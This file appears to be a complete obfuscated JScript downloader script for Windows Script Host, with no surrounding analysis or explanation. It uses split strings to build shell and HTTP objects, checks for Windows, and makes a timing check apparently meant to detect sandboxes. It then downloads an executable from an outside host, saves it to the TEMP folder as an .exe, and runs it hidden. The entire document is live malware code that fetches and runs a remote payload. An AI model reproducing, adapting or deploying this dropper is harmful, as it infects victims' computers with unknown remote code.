var N1 = false;
var K = "Create"+"Object";
var CA = function RH() {return WScript[K]("WScript"+".Shell");}(), Z = 11;
var U = "MSXML2"+".XMLHTTP";
var FM = 2;
var XJ = FM - 2;
function RY(HZ){CA["Run"](HZ, XJ, XJ);};
function N(){return U + "";};
function UW(J1, IZ){XJ = XJ * 1; return J1 - IZ;};
function F(){return K;};
/*@cc_on
  @if (@_win32 || @_win64)
    N1 = true;
  @end
@*/
if (N1)
{
var RE = "";
function BP(){return 22;};
var BD = 0; var I = 0;
function WQ()
{
var J0 = new this["Date"]();
var N0 = J0["getUTCMilliseconds"]();
WScript["Sleep"](BP());
var J0 = new this["Date"]();
var A0 = J0["getUTCMilliseconds"]();
WScript["Sleep"](BP());
var J0 = new this["Date"]();
var M = J0["getUTCMilliseconds"]();
var BD = "DZ";
BD = UW(A0, N0);
var I = "BI";
I = UW(M, A0);
RE = "open";
return UW(BD, I);
}
var RW = false;
var MZ = false;
for (var VL = XJ; VL < BP() * 1; VL++){if (WQ() != XJ){
RW = true; 
I = "31" + 11 * BD + I; 
MZ = true; 
break;
}}
function J() {return ((RW == true) && (RW == MZ)) ? 1 : XJ;};
if (RW && J() && MZ){
function ZJ() {return CA["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "EN7w5Skipbt.ex" + "e";};
 F0 = N();
 SQ = WScript[K](F0);
 var A = 1;
do { 
	for (;A;){
	try {
		if (A == 1)
		{
			SQ[RE]("GET", "http://a-ntsuhan.com/k38sav", false);
			SQ["send"]();
			PL = "Sleep";
			A = 2;
		}
		WScript[PL](BP() + 120); 
		if (SQ["readystate"] < 2 * 2) continue;
		A = XJ;
		function MU(TF) {var ZK = (1, 2, 3, 4, 5, TF); return ZK;};
		F1 = WScript[F()]("ADODB.Stream");
		F0 = F1;
		F0[RE]();
		F0["type"] = MU(1);
		F0["write"](SQ["ResponseBody"]);
		F1["position"] = MU(XJ);
		F0["Save" + "ToFile"](ZJ(), 2);
		F1["cl"+"ose"]();
		T = ZJ();
		RY(T);
	} catch(O){};};
}while (A);
}
}

